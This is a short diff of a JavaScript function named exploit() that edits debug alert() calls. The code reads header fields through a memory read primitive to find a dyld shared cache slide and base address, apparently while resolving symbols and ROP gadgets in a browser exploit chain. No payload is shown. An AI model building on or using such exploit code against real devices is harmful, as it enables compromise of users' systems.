@@ -659,7 +659,7 @@ function exploit(){
             fail("base_seg");
         }
         var cache_slide = Sub(hdr, base_seg.addr);
-        alert("cache slide" + cache_slide + "vs" + memory.u32(hdr+0x40) +hdr);
+        alert("cache slide" + cache_slide + "vs" + memory.u32(hdr+0x38));
         //base_seg.addr = Add(base_seg.addr, cache_slide
 
         for(var i = 0; i < segs.length; ++i)
@@ -708,7 +708,7 @@ function exploit(){
        
         var syms = {};
         var gadgets = {};
-        alert("dyld base address" + memory.read_i64(memory.u32(hdr + 0x20) + hdr))
+        alert("dyld base address" + memory.u32(hdr + 0x20))
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
         var nimgs = memory.u32(Add(hdr, 0x1c));
         alert(nimgs + "n")
